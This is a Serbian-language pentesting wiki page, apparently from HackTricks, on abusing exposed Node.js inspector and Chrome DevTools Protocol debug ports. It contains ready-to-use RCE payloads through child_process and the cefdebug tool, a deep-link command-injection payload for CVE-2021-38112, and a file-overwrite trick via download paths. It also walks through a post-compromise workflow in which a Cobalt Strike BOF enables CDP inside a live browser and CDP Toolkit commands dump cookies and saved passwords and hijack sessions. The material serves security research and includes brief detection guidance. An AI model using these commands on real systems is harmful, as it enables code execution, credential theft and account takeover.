# Zloupotreba Node inspector/CEF debug-a

{{#include ../../banners/hacktricks-training.md}}

Istorijski praktični primeri uključuju Multimaster walkthrough i CVE-2019-1414 napad preko Visual Studio Code debugger-a; koristite ih kao kontekst specifičan za određenu verziju, umesto da pretpostavite da svaki aktuelni Electron ili Chromium cilj izlaže iste primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Osnovne informacije

[Iz dokumentacije](https://nodejs.org/learn/getting-started/debugging): Kada se pokrene uz prekidač `--inspect`, Node.js proces osluškuje zahteve debugging klijenta. **Podrazumevano**, osluškuje na hostu i portu **`127.0.0.1:9229`**. Svakom procesu se dodeljuje i **jedinstven** **UUID**.<sup>[[4]](#references)</sup>

Inspector klijenti moraju da znaju i navedu adresu hosta, port i UUID da bi se povezali. Puna URL adresa izgledaće otprilike ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima pun pristup Node.js izvršnom okruženju**, zlonamerni akter koji može da se poveže na ovaj port možda može da izvršava proizvoljan kod u ime Node.js procesa (**potencijalna eskalacija privilegija**).<sup>[[4]](#references)</sup>

Inspector se može pokrenuti na nekoliko načina:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Kada pokrenete proces koji se ispituje, pojaviće se nešto poput ovoga:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) mogu da izlože debugger pomoću opcije `--remote-debugging-port=9222`. Ovo izlaže browser preko [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a ne Node.js inspector-a, pa payloads zasnovani na Node.js `process` nisu podrazumevano direktno primenljivi.<sup>[[2]](#references)[[5]](#references)</sup>

Kada pokrenete browser sa uključenim debuggerom, pojaviće se nešto poput ovoga:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerisanje i upravljanje CDP endpointom

HTTP discovery endpointi razlikuju **browser** WebSocket od pojedinačnih **target** WebSocketova (tab, worker, extension itd.). Pošaljite upit na `/json/version` za browser endpoint, a na `/json/list` za targete; vraćene vrednosti `webSocketDebuggerUrl` zatim se mogu direktno koristiti za upravljanje pomoću CDP poruka nalik JSON-RPC-u.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Na primer, povežite se pomoću `websocat "$BROWSER_WS"` i pošaljite `{"id":1,"method":"Target.getTargets"}` ili `{"id":2,"method":"Storage.getCookies"}`. Na page target-u (`websocat "$PAGE_WS"`), `Runtime.evaluate` se izvršava u tom renderer-u, a `Page.captureScreenshot` vraća screenshot kodiran u base64 formatu. `document.cookie` ne može da otkrije `HttpOnly` kolačiće, dok `Storage.getCookies` traži kolačiće iz browser-ovog skladišta.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Pregledači, WebSocket-i i politika istog porekla <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Veb-sajtovi otvoreni u veb-pregledaču mogu da šalju WebSocket i HTTP zahteve u skladu sa bezbednosnim modelom pregledača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije debugger-a**. **Politika istog porekla** sprečava veb-sajtove da uspostave **ovu HTTP vezu**. Kao dodatnu zaštitu od [**DNS rebinding napada**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da li zaglavlja **'Host'** za tu vezu navode **IP adresu** ili tačno **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ove **bezbednosne mere sprečavaju iskorišćavanje inspector-a** za pokretanje koda **samim slanjem HTTP zahteva** (što bi se moglo uraditi iskorišćavanjem ranjivosti SSRF).<sup>[[4]](#references)</sup>

### Pokretanje inspector-a u aktivnim procesima

Možete poslati **signal SIGUSR1** pokrenutom Node.js procesu da biste pokrenuli **inspector** na podrazumevanom portu. Međutim, imajte na umu da su vam potrebne dovoljne privilegije. Zato vam ovo može omogućiti **privilegovan pristup informacijama unutar procesa**, ali ne i direktnu eskalaciju privilegija.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa opcijom `--inspect` **nije moguće** zato što će **kontejner** biti **ugašen** zajedno sa procesom.<sup>[[6]](#references)</sup>

### Povezivanje sa inspector/debugger-om

Da biste se povezali sa **pregledačem zasnovanim na Chromium-u**, možete pristupiti URL-ovima `chrome://inspect` ili `edge://inspect` za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nakon toga će se pojaviti URL za pristup debugger-u. npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debugger-om: Da biste se povezali sa pregledačem zasnovanim na Chromium-u,...](<../../images/image (674).png>)

Pomoću **komandne linije** možete se povezati sa debugger/inspector-om koristeći:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava da **pronađe inspektore** koji rade lokalno i **ubrizga kod** u njih.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Imajte na umu da **NodeJS RCE exploit-i neće raditi** ako ste povezani sa pregledačem preko [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (potrebno je da proverite API kako biste pronašli zanimljive stvari koje možete da uradite pomoću njega).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE u NodeJS Debugger/Inspector-u

> [!TIP]
> Ako ste došli ovde tražeći kako da dobijete [**RCE putem XSS-a u Electron-u, pogledajte ovu stranicu.**](../../desktop-application-security/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE-a** kada možete da se **povežete** sa Node **inspector-om** koriste nešto poput sledećeg (čini se da ovo **neće raditi u vezi sa Chrome DevTools protocol-om**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payload-i Chrome DevTools protokola

API možete da proverite ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
U ovom odeljku ću samo navesti zanimljive stvari za koje sam pronašao da su ih ljudi koristili za zloupotrebu ovog protokola.

### Ograničenje podrazumevanog profila u Chrome 136+

Počev od **Chrome 136**, Chrome ignoriše opcije `--remote-debugging-port` i `--remote-debugging-pipe` kada ciljaju **podrazumevani direktorijum sa podacima Chrome-a**. Opcija mora da se koristi zajedno sa nestandardnom opcijom `--user-data-dir`, čiji zaseban ključ za šifrovanje i izolovano stanje pregledača sprečavaju jednostavnu tehniku zasnovanu na zastavicama da izloži uobičajeni, autentifikovani profil korisnika. Ne treba pretpostaviti da ovo ograničenje specifično za Chrome važi za starije verzije Chrome-a, Chrome for Testing, aplikacije Electron/CEF ili druge izvedenice Chromium-a bez prethodne provere.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Prema tome, to što vidite trenutni Chrome proces pokrenut samo sa opcijom `--remote-debugging-port` **ne** dokazuje da je CDP postao aktivan. Proverite listener i `/json/version`, pa utvrdite koji profil ga zaista koristi.<sup>[[14]](#references)</sup>

### Ubrizgavanje parametara putem deep linkova

U slučaju [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security je otkrio da je aplikacija zasnovana na CEF-u u sistemu registrovala prilagođeni UR**I** (workspaces://index.html), koji je primao ceo URI, a zatim pokretao aplikaci**ju** zasnovanu na CEF-u sa konfiguracijom koja se delimično sastavljala na osnovu tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su URI parametri dekodirani iz URL-a i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućavalo da **ubaci** zastavicu **`--gpu-launcher`** u **komandnu liniju** i izvrši proizvoljne komande.<sup>[[8]](#references)</sup>

Dakle, payload poput ovog:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Pokrenuće calc.exe.<sup>[[8]](#references)</sup>

### Prepisivanje datoteka

Promenite fasciklu u koju će se **preuzete datoteke čuvati** i preuzmite datoteku da biste **prepisali** često korišćeni **izvorni kod** aplikacije svojim **zlonamernim kodom**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE i eksfiltracija

STAR Labs je pokazao da izloženi WebDriver/CDP servisi mogu omogućiti proizvoljno čitanje datoteka i RCE; DNS rebinding u nekim konfiguracijama može dovršiti lanac eksploatacije.<sup>[[9]](#references)</sup>

ChromeDriver-ov WebDriver servis se razlikuje od Chrome DevTools/CDP-a. Njegova [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) opcija određuje izvršnu datoteku pregledača koja se pokreće za novu sesiju. Ako neprivilegovani pozivalac može da pristupi ChromeDriver servisu koji radi kao root i pošalje sesiju sa putanjom do izvršne datoteke koju kontroliše, to pokretanje može preći granicu privilegija servisa. Prazan odgovor na `/sessions` ne određuje da li je moguće kreirati nove sesije. Pre nego što zaključite da je ovaj pristup iskoristiv, proverite vlasnika procesa, stvarnu dostupnost listener-a, autorizaciju sesije, pristup izvršnoj datoteci i mere ograničavanja; samo ime procesa ili uobičajeni port nisu dovoljni. [Google-ove bezbednosne smernice](https://developer.chrome.com/docs/chromedriver/security-considerations) preporučuju pokretanje ChromeDriver-a pod neprivilegovanim nalogom. Pasivno nabrajanje ne bi trebalo da kreira WebDriver sesiju.

Za dodatne istorijske slučajeve bezbednosti automatizacije pregledača i Chromium-a pogledajte Counter WebDriver write-up i Project Zero probleme 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Omogućavanje CDP-a unutar aktivnog Chromium procesa

Chrome-ovo ograničenje podrazumevanog profila blokira samo put aktivacije preko komandne linije. Uz dovoljan pristup istog korisnika za manipulisanje procesom pregledača, originalni [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) i Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) pozivaju Chromium-ovu neizvezenu funkciju `content::DevToolsAgentHost::StartRemoteDebuggingServer` unutar već pokrenutog `chrome.exe` ili `msedge.exe`. Zbog toga krajnja tačka pripada stvarnom profilu i zadržava njegove kartice, ekstenzije, kolačiće i autentifikovano stanje.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Za uobičajene x64 procese Chrome/Edge-a, BOF pronalazi prozor pregledača i učitani `chrome.dll`/`msedge.dll`, pretražuje udaljeni PE za maskirane potpise, alocira stub-ove i blok konteksta, privremeno zamenjuje proceduru prozora i izvršava završni poziv na **UI niti** pregledača. Relevantni ulazi tokom izvršavanja su `StartRemoteDebuggingServer`, Chromium-ov `operator new`, `TCPServerSocketFactory::CreateForHttpServer` i vtable fabrike. Izvršavanje se zaustavlja ako bilo koji obavezni potpis nema jedinstveno poklapanje.<sup>[[15]](#references)[[16]](#references)</sup>

BOF prihvata režim pregledača i opciono port. Njegova pomoćna skripta zatim može da proveri krajnju tačku i prikupi kolačiće; `chrome-iso` je zaseban pristup za Windows granicu Chrome-ove izolacije procesa.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Putanja `chrome-iso` koristi samo handles ograničene na upite ka izolovanom procesu. Identifikuje instalirani `chrome.dll` čija se veličina PE slike podudara sa veličinom aktivnog procesa, razrešava simbole iz te lokalne slike i koristi Chromium-ov `WindowImpl` dispatch, zajedno sa sinhronim `WM_COPYDATA` i postojećim User32 hook-om iz slike, da bi pristupila UI thread-u.<sup>[[16]](#references)</sup>

> [!WARNING]
> Ovo je tehnika za **manipulaciju browser procesom nakon kompromitacije**, a ne zaobilaženje autentifikacije preko mreže. Zavisi od verzije jer relevantni C++ simboli nisu izvezeni i mogu se promeniti nakon ažuriranja browser-a.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Osvežavanje potpisa nakon ažuriranja browser-a

Koristite tačnu verziju `chrome.dll` ili `msedge.dll` instaliranu na meti i odgovarajući PDB. `symchk.exe` iz Windows SDK-a preuzima simbole; zatim skripte iz repozitorijuma pronalaze `StartRemoteDebuggingServer`, izvode ulaze za allocator/socket-factory ili proveravaju svaki potpis ugrađen u BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Rezultat bez pogodaka ili sa više pogodaka ne sme se zameniti proizvoljnom adresom. Ako se poznati obrazac `operator new` ili `CreateForHttpServer` previše promenio da bi poslužio kao osnova za novu masku, upotrebite `pe_signature_finder.py` sa PDB-om da pregledate taj simbol i izvedete niz bajtova koji je jedinstven u ciljnom modulu.<sup>[[16]](#references)[[18]](#references)</sup>

#### Ekstrakcija iz autentifikovanog pregledača pomoću CDP Toolkit-a

Ova tehnika ne dešifruje App-Bound Encryption (ABE) offline niti uklanja vezivanje za uređaj. Umesto toga, koristi legitimni pregledač kao **oracle za dešifrovanje i proxy za autentifikovanu interakciju**: `Storage.getCookies` traži od aktivnog pregledača podatke iz njegovog skladišta kolačića, dok navigacija i screencast tokovi zadržavaju zahteve, skladište, autentifikaciju u preduzeću i ponašanje vezano za uređaj unutar postojećeg pregledača žrtve.<sup>[[17]](#references)[[18]](#references)</sup>

Nakon prosleđivanja loopback CDP listener-a kroz pivot operatera, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) može da otkrije i prikupi uobičajene artefakte.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` i `tabs screenshot` uglavnom su omotači oko `/json/version`, liste ciljnih stranica, `Storage.getCookies` i `Page.captureScreenshot`. Za istoriju, obeleživače, ekstenzije i metapodatke o lozinkama potrebna je privremena WebUI ciljna stranica `chrome://`/`edge://`: alat čeka da se stranica prikaže, pregleda njen model ili DOM, prikuplja rezultat i zatvara ciljnu stranicu.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` ide korak dalje: otvara stvarni izvor sačavljene prijave, fokusira polje za akreditive, bira predlog izvornog automatskog popunjavanja pomoću CDP ulaznih događaja i čita popunjene vrednosti. Izvor/port/putanja moraju se tačno poklapati sa domenom sačuvane lozinke; vidljivi režim je pouzdan podrazumevani izbor zato što je iskačući prozor sa predlozima izvorni UI pregledača.<sup>[[17]](#references)[[18]](#references)</sup>

Za interakciju uživo, `browser-takeover screencast` strimuje kadrove i šalje ulaz stvarnoj ciljnoj stranici (uključujući režime rada u pozadini ili van ekrana). `browser-takeover proxy` umesto toga lokalno prihvata HTTP i HTTPS `CONNECT` zahteve i šalje uzvodne zahteve kroz skrivene Chrome ciljne stranice, a kada skrivene ciljne stranice nisu dostupne, koristi kartice u pozadini; time se čuva mrežni/autentifikacioni kontekst žrtve, ali je postupak manje veran za složene klijentske aplikacije jer pregledač operatera prikazuje vraćeni sadržaj.<sup>[[17]](#references)[[18]](#references)</sup>

Za detekciju se nemojte oslanjati samo na telemetriju komandne linije `--remote-debugging-*`: korelišite i neuobičajene ručke i memorijske operacije povezane sa procesima pregledača (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, kreiranje niti), DLL injection i neočekivane loopback listening sockets koje koriste Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

U stvarnom okruženju, **nakon kompromitovanja** korisničkog računara na kom se koristi pregledač zasnovan na Chromium-u, istorijska tehnika bila je ponovno pokretanje pregledača sa omogućenim debugging-om i prosleđivanje loopback porta. To može izložiti stanje pregledanja žrtve na proizvodima/verzijama koje još prihvataju izabrani profil, ali Chrome 136+ to neće dozvoliti za podrazumevani direktorijum podataka.<sup>[[7]](#references)[[14]](#references)</sup>

Izvorna komanda za ponovno pokretanje navedena je ispod za starije ciljeve/verzije. Druga komanda je podržani oblik za aktuelni Chrome, ali ona kreira izolovani profil umesto da ponovo otvori uobičajeno autentifikovano stanje žrtve.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Za macOS-specifične Chromium tehnike ponovnog pokretanja, proširenja i CDP-a, pogledajte [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - alat za pregled i eksploataciju CEF/Chromium debugger-a](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution u Visual Studio Code-u preko Chrome DevTools Debugger-a](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Vodič za debugging Node.js-a - Prvi koraci](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome-ove funkcije za debugging radi daljinskog posmatranja i kontrole sesija pregledanja](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution u AWS WorkSpaces-u](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Obraćaš li se meni? - WebDriver RCE preko DNS Rebinding-a i CDP-a (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Od bota do RCE-a](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Promene u prekidačima za remote debugging radi poboljšanja bezbednosti - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Ubacivanje CDP-a u pokrenuti Edge Browser: detaljan pregled instrumentacije browser-a u runtime-u](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Povratak Cookie Monster-a](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
